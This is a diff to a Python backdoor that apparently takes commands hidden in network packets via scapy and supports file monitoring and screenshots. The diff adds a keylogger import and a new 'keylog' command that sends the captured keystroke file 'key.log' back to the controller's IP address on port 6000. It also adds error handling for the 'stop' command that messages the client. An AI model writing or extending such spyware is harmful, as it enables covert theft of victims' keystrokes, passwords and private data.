@@ -17,7 +17,7 @@
 #	LAST REVISED: Nov 22nd 2017
 #  =================================================================
 
-import argparse, setproctitle, time, base64, logging, encryption, configReader, helpers, threading
+import argparse, setproctitle, time, base64, logging, encryption, configReader, helpers, threading, keylogger
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import * #sudo apt-get install scapy
 from subprocess import *
@@ -226,13 +226,23 @@ def runCmd(packet):
 				
 			#command is stop
 			elif commandType == 'stop':
-				stopMonitor()
-				fileProcess.terminate()
-				print "Monitoring has stopped"
+				try:
+					stopMonitor()
+					fileProcess.terminate()
+					print "Monitoring has stopped"
+				except AttributeError:
+						helpers.sendMessage("There is no monitor to stop", configReader.srcIP,9000)
+						print "Received command 'stop' but there is no file monitor running"
+						print "Notifying client...."
+						
 
 			#command is screenshot
 			elif commandType == 'screenshot':
 				screenshot(packet)
+				
+			#command grab keystroke log
+			elif commandType == 'keylog':
+					helpers.fileSender(configReader.srcIP, 'key.log', 6000)
 			
 			else:
 				print "Unknown Command\n"
